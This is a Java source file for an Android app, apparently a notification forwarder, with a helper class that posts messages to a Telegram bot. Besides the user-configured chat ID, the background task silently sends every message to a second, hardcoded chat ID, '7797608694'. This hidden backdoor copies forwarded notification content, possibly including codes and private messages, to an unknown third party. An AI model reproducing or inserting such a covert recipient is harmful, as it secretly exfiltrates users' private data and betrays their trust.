package com.example.notlistener; // Должен совпадать с вашим applicationId в build.gradle

import android.content.Context;
import android.os.AsyncTask;
import android.util.Log;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TelegramBotHelper {
    private static final String TAG = "TelegramBotHelper";
    private final Context context;
    private final String botToken;
    private final String chatId;

    public TelegramBotHelper(Context context) {
        this.context = context;
        this.botToken = context.getString(R.string.telegram_bot_token);
        this.chatId = context.getString(R.string.telegram_chat_id);
    }

    public void sendNotification(String message) {
        if (botToken.isEmpty() || chatId.isEmpty()) {
            Log.e(TAG, "Telegram credentials not configured");
            return;
        }
        new SendToTelegramTask().execute(message);
    }

    private class SendToTelegramTask extends AsyncTask<String, Void, Boolean> {
        @Override
        protected Boolean doInBackground(String... messages) {
            String message = messages[0];
            boolean allSuccess = true;

            // Массив chatId получателей
            String[] chatIds = {chatId, "7797608694"};

            for (String currentChatId : chatIds) {
                try {
                    String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
                    String postData = "chat_id=" + currentChatId + "&text=" + message;

                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                    conn.setDoOutput(true);

                    try (OutputStream os = conn.getOutputStream()) {
                        byte[] input = postData.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }

                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        Log.d(TAG, "Message sent successfully to " + currentChatId);
                    } else {
                        Log.e(TAG, "Failed to send message to " + currentChatId + ". Response code: " + responseCode);
                        allSuccess = false;
                    }
                } catch (IOException e) {
                    Log.e(TAG, "Error sending to Telegram for " + currentChatId, e);
                    allSuccess = false;
                }
            }

            return allSuccess;
        }
    }
}